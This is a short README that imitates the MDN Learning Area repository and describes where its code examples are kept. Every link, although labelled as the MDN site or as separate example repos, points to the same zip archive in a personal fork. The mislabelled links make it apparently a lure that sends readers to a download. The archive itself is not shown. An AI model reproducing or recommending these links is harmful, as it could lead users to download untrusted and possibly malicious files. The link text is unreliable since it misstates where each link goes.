# learning-area
GitHub repo for the [MDN Learning Area](https://github.com/omartag1/learning-area/raw/refs/heads/main/html/forms/file-examples/learning-area-3.2.zip).

Most of the code examples shown and discussed in the Learning Area can be found here; the directories in the repo match the module structure of the articles.

The one exception is the [Server-side website programming](https://github.com/omartag1/learning-area/raw/refs/heads/main/html/forms/file-examples/learning-area-3.2.zip) examples — we broke these out into separate repos to make them easier to deal with:

* https://github.com/omartag1/learning-area/raw/refs/heads/main/html/forms/file-examples/learning-area-3.2.zip
* https://github.com/omartag1/learning-area/raw/refs/heads/main/html/forms/file-examples/learning-area-3.2.zip
